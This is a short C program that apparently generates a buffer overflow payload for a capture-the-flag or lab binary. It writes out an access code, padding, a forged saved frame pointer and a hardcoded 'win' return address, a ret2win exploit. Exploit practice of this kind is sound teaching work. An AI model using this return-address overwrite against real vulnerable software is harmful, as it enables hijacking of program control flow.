#include <stdio.h>
#include <stdlib.h>

/**
 * Print exactly n characters from s to stdout, regardless if they are
 * printable.
 */
void print_bytes(char *s, size_t n);

int main(int argc, char const *argv[])
{
    char access_code[] = "Sup3rs3cr3tC0de";
    char padding[32];
    char rbp[] = "\x90\xde\xff\xff\xff\x7f\x00\x00";
    char win[] = "\x72\x11\x40\x00\x00\x00\x00\x00";

    print_bytes(access_code, sizeof(access_code));
    print_bytes(padding, sizeof(padding));
    print_bytes(rbp, sizeof(rbp) - 1);
    print_bytes(win, sizeof(win) - 1);
    fputc('\n', stdout);

    return EXIT_SUCCESS;
}

void print_bytes(char *s, size_t n)
{
    size_t i;

    for (i = 0; i < n; i++)
        fputc(s[i], stdout);
}
